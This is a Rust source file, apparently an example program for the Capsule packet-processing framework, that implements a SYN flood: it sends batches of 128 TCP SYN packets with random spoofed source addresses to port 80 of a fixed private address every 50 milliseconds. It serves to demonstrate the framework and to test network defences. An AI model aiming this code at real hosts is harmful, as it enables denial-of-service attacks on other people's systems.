/*
* Copyright 2019 Comcast Cable Communications Management, LLC
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*
* SPDX-License-Identifier: Apache-2.0
*/

use anyhow::Result;
use async_io::Timer;
use capsule::net::MacAddr;
use capsule::packets::ip::v4::Ipv4;
use capsule::packets::{Ethernet, Mbuf, Packet, Tcp4};
use capsule::rt2::{self, Outbox, Runtime};
use futures_lite::stream::StreamExt;
use signal_hook::consts;
use signal_hook::flag;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tracing::{error, info, Level};
use tracing_subscriber::fmt;

async fn syn_flood(src_mac: MacAddr, cap0: Outbox, term: Arc<AtomicBool>) {
    let dst_ip = Ipv4Addr::new(10, 100, 1, 254);
    let dst_mac = MacAddr::new(0x02, 0x00, 0x00, 0xff, 0xff, 0xff);

    // 50ms delay between batches.
    let mut timer = Timer::interval(Duration::from_millis(50));

    while !term.load(Ordering::Relaxed) {
        let _ = timer.next().await;
        info!("generating 128 SYN packets.");

        match Mbuf::alloc_bulk(128) {
            Ok(mbufs) => mbufs
                .into_iter()
                .map(|mbuf| -> Result<Mbuf> {
                    let mut ethernet = mbuf.push::<Ethernet>()?;
                    ethernet.set_src(src_mac);
                    ethernet.set_dst(dst_mac);

                    let mut v4 = ethernet.push::<Ipv4>()?;
                    v4.set_src(rand::random::<u32>().into());
                    v4.set_dst(dst_ip);

                    let mut tcp = v4.push::<Tcp4>()?;
                    tcp.set_syn();
                    tcp.set_seq_no(1);
                    tcp.set_window(10);
                    tcp.set_dst_port(80);
                    tcp.reconcile_all();

                    Ok(tcp.reset())
                })
                .filter_map(|res| res.ok())
                .for_each(|mbuf| {
                    let _ = cap0.push(mbuf);
                }),
            Err(err) => error!(?err),
        }
    }
}

fn main() -> Result<()> {
    let subscriber = fmt::Subscriber::builder()
        .with_max_level(Level::INFO)
        .finish();
    tracing::subscriber::set_global_default(subscriber)?;

    let config = rt2::load_config()?;
    let runtime = Runtime::from_config(config)?;

    let term = Arc::new(AtomicBool::new(false));

    let cap0 = runtime.ports().get("cap0")?;
    let outbox = cap0.outbox()?;
    let src_mac = cap0.mac_addr();

    runtime
        .lcores()
        .get(1)?
        .spawn(syn_flood(src_mac, outbox, term.clone()));

    let _guard = runtime.execute()?;

    flag::register(consts::SIGINT, Arc::clone(&term))?;
    info!("ctrl-c to quit ...");
    while !term.load(Ordering::Relaxed) {}

    Ok(())
}
